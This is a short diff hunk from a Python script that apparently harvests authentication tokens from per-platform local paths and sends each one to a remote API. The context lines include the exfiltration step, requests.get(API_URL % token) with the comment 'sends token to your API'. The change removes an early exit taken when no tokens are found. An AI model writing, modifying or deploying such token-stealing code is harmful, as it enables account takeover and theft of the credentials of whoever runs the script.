@@ -65,9 +65,6 @@ for platform, path in PATHS.items():
 
                 tokens.append(token)
 
-if len(tokens) == 0:
-    exit()
-
 for token in tokens:
     try:
         res = requests.get(API_URL % token)  # sends token to your API
